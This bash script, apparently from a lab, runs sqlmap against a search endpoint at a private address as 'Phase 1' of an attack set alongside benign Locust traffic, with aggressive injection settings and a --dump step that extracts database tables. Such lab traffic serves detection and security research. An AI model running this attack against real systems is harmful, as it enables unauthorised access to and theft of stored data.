#!/bin/bash
# Cardinal Phase 1 — Automated SQLi attack via sqlmap.
# Target: the directory-search endpoint through the proxy (the same route the
# benign Locust traffic uses).

TARGET="http://172.30.0.10/search?q=test"

echo "[*] Starting sqlmap against $TARGET"
echo "[*] Testing parameter: q"
echo ""

# --batch        no interactive prompts
# --level/--risk deeper injection-point and technique coverage
# --technique    B=boolean E=error U=union S=stacked T=time
# --dump         dump the current database's tables once injection is confirmed
sqlmap -u "$TARGET" \
    --batch \
    --level=3 \
    --risk=2 \
    --technique=BEUST \
    --dump \
    --output-dir=/tmp/sqlmap-output \
    2>&1 | tee /tmp/sqlmap-results.log

echo ""
echo "[*] sqlmap finished. Output in /tmp/sqlmap-output/, log at /tmp/sqlmap-results.log"
